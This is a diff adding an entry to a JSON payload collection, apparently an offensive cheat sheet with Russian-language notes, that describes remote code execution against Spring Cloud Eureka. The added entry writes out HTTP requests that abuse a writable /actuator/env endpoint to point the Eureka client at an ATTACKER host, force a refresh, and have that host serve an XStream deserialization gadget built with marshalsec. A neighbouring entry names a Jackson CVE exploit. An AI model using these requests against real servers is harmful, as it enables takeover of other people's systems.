@@ -194,6 +194,13 @@
     },
     {
       "subcategory": "Java",
+      "title": "Spring Cloud Eureka: XStream RCE через /actuator/env",
+      "language": "bash",
+      "tags": ["java", "xstream", "eureka", "spring", "spring-cloud", "actuator", "rce"],
+      "body": "# Boot 2.x: записать URL Eureka-клиента через writable /actuator/env (Boot 1.x: POST /env, form-urlencoded)\nPOST /actuator/env HTTP/1.1\nContent-Type: application/json\n\n{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://ATTACKER:8888/x\"}\n\n# заставить клиент перечитать конфиг и сходить за реестром на твой URL\nPOST /actuator/refresh HTTP/1.1\nContent-Type: application/json\n\n# твой сервер на GET /x/apps/ (Accept: application/xml) отдаёт XStream-гаджет,\n# который Eureka-клиент десериализует -> RCE. Гаджет под classpath генерит marshalsec (модуль XStream)."
+    },
+    {
+      "subcategory": "Java",
       "title": "Jackson CVE-2017-17485 — FileSystemXmlApplicationContext (Spring)",
       "language": "json",
       "tags": ["java", "jackson", "cve", "spring"],
